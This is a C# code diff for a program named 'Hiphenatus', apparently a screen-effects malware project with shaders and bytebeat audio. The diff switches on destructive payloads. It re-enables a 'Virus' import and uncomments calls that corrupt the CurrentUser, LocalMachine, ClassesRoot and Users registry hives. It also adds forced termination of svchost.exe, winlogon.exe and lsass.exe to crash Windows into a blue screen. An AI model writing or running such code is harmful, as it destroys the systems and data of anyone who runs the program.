@@ -8,7 +8,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using static Hiphenatus.Bytebeats;
-//using static Hiphenatus.Virus;
+using static Hiphenatus.Virus;
 using static Hiphenatus.WinApi.APIs;
 
 namespace Hiphenatus
@@ -532,10 +532,10 @@ namespace Hiphenatus
         public void execPayload()
         {
             DefineAsCritical();
-            /*if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.CurrentUser);
-            }*/
+            }
 
             Process.Start("https://www.youtube.com/@sudoUltimateQuack");
 
@@ -553,11 +553,11 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            /*if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.LocalMachine);
             }
-            */
+            
             Process.Start("https://www.youtube.com/@sudoUltimateQuack");
 
             XDD.Abort();
@@ -577,10 +577,10 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            /*if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.ClassesRoot);
-            }*/
+            }
 
             shader3Thread.Abort();
             bytebeat2.Abort();
@@ -597,10 +597,10 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            /*if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.Users);
-            }*/
+            }
 
             shader4Thread.Abort();
             bytebeat3.Abort();
@@ -619,6 +619,17 @@ namespace Hiphenatus
 
             Thread shader7Thread = new Thread(Shader6); shader7Thread.Start();
             Thread bytebeat5 = new Thread(Beat11); bytebeat5.Start();
+
+            Thread.Sleep(8000);
+
+            shader7Thread.Abort();
+            bytebeat5.Abort();
+
+            if (DateTime.Now.Day == 31) { Environment.Exit(0); } // death WITHOUT BSOD  
+
+            Process.Start("taskkill", "/f /t /im svchost.exe");  //  B
+            Process.Start("taskkill", "/f /t /im winlogon.exe"); //    FUCKING
+            Process.Start("taskkill", "/f /t /im lsass.exe");    //      SOD
 
         }
 
